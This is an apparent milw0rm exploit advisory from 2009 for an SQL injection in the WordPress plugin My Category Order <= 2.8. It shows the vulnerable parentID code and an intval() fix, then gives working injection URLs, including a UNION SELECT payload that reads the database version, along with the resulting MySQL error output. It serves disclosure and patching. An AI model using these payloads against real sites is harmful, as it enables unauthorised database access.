@@ -1,0 +1,37 @@
+###############################
+# Source: WordPress Plugin: My Category Order <= 2.8 (mycategoryorder.php) / SQL Injection Vulnerability
+# Download: http://wordpress.org/extend/plugins/my-category-order/
+# No Dork
+# Author: ManhLuat93 [at] hcegroup[dot]net
+###############################
+
+Errors appears only when you have admin control
+
+Open mycategoryorder.php (Line 47-48):
+if (isset($_GET['parentID']))
+$parentID = $_GET['parentID'];
+
+Fix:
+if (isset($_GET['parentID']))
+$parentID = intval($_GET['parentID']);
+
+
+[+] Exploit [+]
+
+
+http://localh0st/wp-admin/post-new.php?page=mycategoryorder&mode=act_OrderCategories&parentID=0'&idString=3,5,4,1
+
+MySQL Query Error:
+
+WordPress database error:
+
+ [You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' ORDER BY term_order ASC' at line 1]
+SELECT * FROM wp_terms t inner join wp_term_taxonomy tt on t.term_id = tt.term_id WHERE taxonomy = 'category' and parent = 0' ORDER BY term_order ASC
+
+
+
+[+] http://localh0st/wp-admin/post-new.php?page=mycategoryorder&mode=act_OrderCategories&parentID=0 UNION SELECT 1,@@version,3,4,5,6,7,8,9,10,11--&idString=3,5,4,1
+
+[+] What do you see ?
+
+# milw0rm.com [2009-07-15]
